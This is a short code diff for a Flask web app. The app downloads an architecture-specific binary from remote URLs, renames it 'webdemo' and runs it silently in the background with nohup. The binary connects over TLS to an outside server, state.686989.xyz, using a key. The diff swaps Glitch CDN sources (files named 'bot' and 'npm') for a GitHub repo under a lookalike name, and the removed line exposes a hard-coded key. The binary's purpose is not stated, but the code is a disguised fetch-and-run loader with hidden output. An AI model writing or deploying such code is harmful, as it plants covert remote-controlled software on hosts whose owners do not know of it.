@@ -15,6 +15,7 @@ app = Flask(__name__)
 
 # Set environment variables
 FILE_PATH = os.environ.get('FILE_PATH', './temp')
+SERVER_KEY = os.environ.get('SERVER_KEY', 'YOUR_KEY')
 
 # Create directory if it doesn't exist
 if not os.path.exists(FILE_PATH):
@@ -70,7 +71,7 @@ def download_files_and_run():
     authorize_files(files_to_authorize)
 
     # Run Server
-    command = f"nohup {FILE_PATH}/webdemo -s state.686989.xyz:443 -p jZtksXcO78rinyqKZv --tls >/dev/null 2>&1 &"
+    command = f"nohup {FILE_PATH}/webdemo -s state.686989.xyz:443 -p {SERVER_KEY} --tls >/dev/null 2>&1 &"
     try:
         subprocess.run(command, shell=True, check=True)
         print('webdemo is running')
@@ -84,11 +85,11 @@ def download_files_and_run():
 def get_files_for_architecture(architecture):
     if architecture == 'arm':
         return [
-            {'file_name': 'webdemo', 'file_url': 'https://cdn.glitch.global/ee4c6d91-51ac-46bd-8959-5add2459a016/bot?v=1726841050979'},
+            {'file_name': 'webdemo', 'file_url': 'https://raw.githubusercontent.com/hello-google/hello-python/main/webdemo_arm'},
         ]
     elif architecture == 'amd':
         return [
-            {'file_name': 'webdemo', 'file_url': 'https://cdn.glitch.me/ee4c6d91-51ac-46bd-8959-5add2459a016/npm?v=1726836593556'},
+            {'file_name': 'webdemo', 'file_url': 'https://raw.githubusercontent.com/hello-google/hello-python/main/webdemo_amd64'},
         ]
     return []
 
